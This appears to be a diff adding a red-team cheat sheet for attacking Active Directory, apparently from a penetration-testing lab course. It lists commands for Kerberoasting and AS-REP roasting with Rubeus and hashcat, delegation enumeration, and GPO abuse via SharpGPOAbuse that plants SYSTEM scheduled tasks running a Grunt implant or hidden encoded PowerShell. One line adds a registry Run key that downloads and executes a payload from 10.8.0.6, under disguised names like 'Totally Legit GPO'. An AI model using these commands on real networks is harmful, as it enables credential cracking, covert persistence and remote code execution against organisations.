@@ -1,0 +1,34 @@
+#Kerberos
+SPN
+PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName 
+
+Rubeus kerberoast 
+hashcat -a 0 -m 13100 kerberoast-hashes /usr/share/wordlists/rockyou.txt 
+
+#ASREPRoasting
+PowerShell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
+Rubeus asreproast
+hashcat -a 0 -m 18200 kerberoast-hashes /usr/share/wordlists/rockyou.txt
+
+#Unconstrained Delegation
+PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
+
+https://resources.infosecinstitute.com/topic/active-directory-series-unconstrained-delegation/
+
+#GPO-ABUSE
+https://www.flu-project.com/2020/12/jugando-con-gpos-2.html
+Create GPOs
+Modify existing GPOs
+Link GPOs to OUs
+
+PowerShell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+
+PowerShell New-GPO -Name 'Another Totally Legit GPO' | New-GPLink -Target 'OU=5735,OU=Workstations,DC=cyberbotic,DC=io'
+Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\Grunt.exe\" --GPOName \"Rasta GPO\""
+Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Legit Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c powershell -nop -w hidden -enc [...snip...]\" --GPOName \"Another Totally Legit GPO\""
+ 
+PowerShell Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'powershell -w 1 -c "iex (new-object net.webclient).downloadstring(''http://10.8.0.6/HTTPGrunt.ps1'')"' -Type ExpandString
+
+
+
